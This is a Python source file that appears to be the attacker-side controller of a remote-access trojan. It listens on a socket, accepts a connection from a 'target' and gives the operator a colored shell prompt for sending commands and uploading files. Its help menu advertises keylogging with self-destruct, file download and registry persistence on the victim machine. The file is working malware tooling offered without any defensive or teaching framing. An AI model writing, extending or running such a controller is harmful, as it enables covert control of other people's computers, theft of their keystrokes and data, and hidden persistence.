import json, os, socket
from termcolor import colored

def reliable_recv():
    data = ''
    while True:
        try: 
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def target_communication():
    while True:
        command = input(colored(f'* shell~{ip}: ', 'red'))
        reliable_send(command)
        if command == 'exit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command == 'help':
            print(colored(''' \n
            exit                                 --> exit
            clear                                --> clear
            cd <directory>                       --> move to other directory
            upload <file name>                   --> upload ur file to target
            download <file name>                 --> download file from target
            keylog_start                         --> start the keylogger
            keylog_dump                          --> print captured keystrokes
            keylog_stop                          --> stop and self destruct keylogger file
            persistence <regname> <file name>    --> create persistence in registry''', 'blue'))
        else:
            result = reliable_recv()
            print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('127.0.0.1', 5555))
print(colored('[+] listening for connections', 'blue'))
sock.listen(5)
target, ip = sock.accept()
print(colored(f'[+] target connected from {str(ip)}', 'green'))

target_communication()